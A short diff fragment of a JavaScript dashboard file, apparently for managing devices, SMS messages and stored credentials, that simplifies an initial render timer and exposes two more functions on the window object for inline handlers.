         clearBtn.addEventListener('click', clearSearch);
     }
     
-    // Initial render
-    setTimeout(() => {
-        performRender();
-    }, 100);
+    setTimeout(() => performRender(), 100);
 });
 
 // ============================================================
-// GLOBAL EXPOSURE - For inline onclick handlers
+// GLOBAL EXPOSURE
 // ============================================================
 window.togglePanel = togglePanel;
 window.toggleDevice = toggleDevice;
@@ -1766,6 +1671,7 @@ window.clearSearch = clearSearch;
 window.filterDevices = filterDevices;
 window.checkDeviceStatus = checkDeviceStatus;
 window.loadMoreDevices = loadMoreDevices;
+window.loadPrevDevices = loadPrevDevices;
 window.loadMoreDeviceSms = loadMoreDeviceSms;
 window.loadMoreAllSms = loadMoreAllSms;
 window.openSmsModal = openSmsModal;
@@ -1787,3 +1693,4 @@ window.closeBackupSmsModal = closeBackupSmsModal;
 window.refreshDeviceBackup = refreshDeviceBackup;
 window.scrollCredentialsToBottom = scrollCredentialsToBottom;
 window.scrollCredentialsToTop = scrollCredentialsToTop;
+window.performRender = performRender;
